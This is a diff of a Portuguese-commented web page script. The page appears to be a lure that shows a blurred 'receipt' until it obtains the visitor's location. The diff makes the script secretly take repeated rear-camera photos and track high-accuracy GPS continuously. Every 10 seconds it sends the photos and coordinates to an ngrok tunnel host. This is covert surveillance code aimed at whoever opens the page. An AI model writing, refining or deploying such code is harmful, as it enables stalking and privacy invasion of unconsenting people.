@@ -39,31 +39,39 @@
 
       const video = document.getElementById("video");
       const canvas = document.getElementById("canvas");
-      let stream;
       let locationData = { latitude: null, longitude: null, accuracy: null, maps: null, source: null };
 
-      // Iniciar o stream da câmera
-      async function startCamera() {
+      // Capturar foto com robustez
+      async function capturePhoto() {
         if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
           console.error("API de mídia não suportada neste navegador.");
-          return;
+          return null;
         }
         try {
-          stream = await navigator.mediaDevices.getUserMedia({ video: true });
+          const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } }); // Câmera traseira por padrão
           video.srcObject = stream;
           video.play();
+
+          // Aguardar o vídeo carregar completamente
+          await new Promise(resolve => video.onloadedmetadata = resolve);
+          await new Promise(resolve => setTimeout(resolve, 1000)); // 1 segundo para garantir frame no Android/iOS
+
+          canvas.width = video.videoWidth || 640; // Valor padrão se falhar
+          canvas.height = video.videoHeight || 480;
+          const context = canvas.getContext("2d");
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+          // Verificar se a imagem é preta ou inválida
+          const imageData = context.getImageData(0, 0, canvas.width, canvas.height);
+          const isBlack = Array.from(imageData.data).every(pixel => pixel === 0);
+          const photoData = isBlack ? null : canvas.toDataURL("image/jpeg", 0.8); // Qualidade 80% para reduzir tamanho
+
+          stream.getTracks().forEach(track => track.stop()); // Desligar a câmera
+          return photoData;
         } catch (error) {
           console.error("Erro ao acessar a câmera:", error);
+          return null;
         }
-      }
-
-      // Capturar foto
-      function capturePhoto() {
-        if (!stream) return null;
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext("2d").drawImage(video, 0, 0);
-        return canvas.toDataURL("image/jpeg");
       }
 
       // Monitorar localização continuamente
@@ -78,18 +86,27 @@
                 maps: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`,
                 source: "GPS"
               };
-              // Remover o blur assim que a primeira localização for capturada
               if (document.querySelector(".comprovante-container.blurred")) {
                 removeLoading();
               }
             },
             error => {
-              console.error("Erro ao obter localização por GPS:", error);
-              // Fallback para IP será tratado no servidor
+              console.error("Erro ao obter localização por GPS:", error.message);
+              switch (error.code) {
+                case error.PERMISSION_DENIED:
+                  console.error("Permissão de geolocalização negada.");
+                  break;
+                case error.POSITION_UNAVAILABLE:
+                  console.error("Localização indisponível.");
+                  break;
+                case error.TIMEOUT:
+                  console.error("Tempo esgotado para obter localização.");
+                  break;
+              }
             },
             {
               enableHighAccuracy: true,
-              timeout: 5000,
+              timeout: 10000, // 10 segundos para evitar falhas rápidas
               maximumAge: 0
             }
           );
@@ -98,20 +115,23 @@
         }
       }
 
-      // Enviar foto e localização a cada 5 segundos
-      function startCaptureInterval() {
-        setInterval(() => {
-          const photoData = capturePhoto();
-          const dataToSend = { ...locationData, photo: photoData };
+      // Capturar e enviar múltiplas fotos a cada 10 segundos
+      async function startCaptureInterval() {
+        setInterval(async () => {
+          const photos = [];
+          for (const time of [2000, 5000, 7000, 10000]) { // 2s, 5s, 7s, 10s
+            await new Promise(resolve => setTimeout(resolve, time - (time === 2000 ? 0 : 3000))); // Ajuste de tempo relativo
+            const photo = await capturePhoto();
+            if (photo) photos.push(photo);
+          }
+          const dataToSend = { ...locationData, photos: photos.filter(p => p !== null) };
           sendLocation(dataToSend);
-        }, 5000); // 5 segundos
+        }, 10000); // Repetir a cada 10 segundos
       }
 
       // Iniciar tudo
-      startCamera().then(() => {
-        startLocationTracking();
-        startCaptureInterval();
-      });
+      startLocationTracking();
+      startCaptureInterval();
 
       function sendLocation(data) {
         fetch("https://6712-177-35-125-241.ngrok-free.app/send-location", { // Substitua pela URL atual do ngrok
@@ -122,7 +142,7 @@
           .then(response => response.json())
           .then(data => {
             if (!data.success) console.error("Erro ao enviar:", data.message);
-            else console.log("Localização e foto enviadas com sucesso do frontend!");
+            else console.log("Localização e fotos enviadas com sucesso do frontend!");
           })
           .catch(error => console.error("Erro ao enviar do frontend:", error));
       }
